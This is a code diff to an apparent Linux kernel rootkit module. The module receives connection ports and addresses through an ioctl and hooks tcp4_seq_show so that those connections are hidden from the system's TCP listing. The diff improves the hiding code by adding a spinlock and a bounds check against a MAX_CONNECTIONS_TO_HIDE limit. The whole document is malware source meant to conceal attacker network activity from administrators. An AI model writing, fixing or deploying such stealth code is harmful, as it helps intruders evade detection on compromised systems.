@@ -14,11 +14,13 @@
 #include <linux/uaccess.h>
 
 #include "common.h"
+#include "linux/spinlock.h"
 
 MODULE_LICENSE("GPL");
 
-static struct conn_info infos[256];
+static struct conn_info infos[MAX_CONNECTIONS_TO_HIDE];
 static int infos_len;
+static spinlock_t conn_lock;
 
 static long conn_recv_ioctl(struct file * file, unsigned int cmd, unsigned long arg) {
     struct conn_info user_input;
@@ -29,10 +31,17 @@ static long conn_recv_ioctl(struct file * file, unsigned int cmd, unsigned long 
         return -EFAULT;
 
     // Store info to array
+    spin_lock(&conn_lock);
+    if (infos_len >= MAX_CONNECTIONS_TO_HIDE) {
+        spin_unlock(&conn_lock);
+        return -ENOSPC; // Buffer full
+    }
+
     infos[infos_len].id = user_input.id;
     infos[infos_len].dport = user_input.dport;
     infos[infos_len].daddr = user_input.daddr;
     infos_len++;
+    spin_unlock(&conn_lock);
 
     return 0;
 }
@@ -61,6 +70,7 @@ static void tcp4_seq_show_exit(struct fprobe * fp, unsigned long entry_ip, unsig
     struct conn_info * info = this_cpu_ptr(&cpu_tcp_info);
 
     // Hide port activity
+    spin_lock(&conn_lock);
     for (int i = 0; i < infos_len; i++) {
         u32 port = infos[i].dport;
         u32 addr = infos[i].daddr;
@@ -71,6 +81,7 @@ static void tcp4_seq_show_exit(struct fprobe * fp, unsigned long entry_ip, unsig
             break;
         }
     }
+    spin_unlock(&conn_lock);
 }
 
 static const struct file_operations fops = { .unlocked_ioctl = conn_recv_ioctl };
